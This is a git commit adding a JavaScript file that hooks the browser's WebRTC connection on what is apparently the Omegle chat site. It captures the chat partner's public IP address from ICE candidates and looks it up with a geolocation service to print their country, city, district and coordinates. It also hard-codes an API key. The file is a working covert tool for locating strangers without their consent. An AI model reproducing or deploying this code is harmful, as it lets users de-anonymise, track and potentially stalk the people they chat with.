6d2685d8c966211a8dd300b0e9dd570a92ca5dd6
Amir <78368930+amir-cyber82@users.noreply.github.com>
2021-02-22 15:22:54 +0330

    Create main code.js

---
+++ main code.js
@@ -0,0 +1,44 @@
+/* find pepole location program
+It's only work on omega website */
+
+let apiKey = "c56d2b7949004e55846064d897dbe23e";
+
+window.oRTCPeerConnection =
+  window.oRTCPeerConnection || window.RTCPeerConnection;
+
+window.RTCPeerConnection = function (...args) {
+  const pc = new window.oRTCPeerConnection(...args);
+
+  pc.oaddIceCandidate = pc.addIceCandidate;
+
+  pc.addIceCandidate = function (iceCandidate, ...rest) {
+    const fields = iceCandidate.candidate.split(" ");
+
+    console.log(iceCandidate.candidate);
+    const ip = fields[4];
+    if (fields[7] === "srflx") {
+      getLocation(ip);
+    }
+    return pc.oaddIceCandidate(iceCandidate, ...rest);
+  };
+  return pc;
+};
+
+let getLocation = async (ip) => {
+  let url = `https://api.ipgeolocation.io/ipgeo?apiKey=${apiKey}&ip=${ip}`;
+
+  await fetch(url).then((response) =>
+    response.json().then((json) => {
+      const output = `
+          ---------------------
+          Country: ${json.country_name}
+          State: ${json.state_prov}
+          City: ${json.city}
+          District: ${json.district}
+          Lat / Long: (${json.latitude}, ${json.longitude})
+          ---------------------
+          `;
+      console.log(output);
+    })
+  );
+};
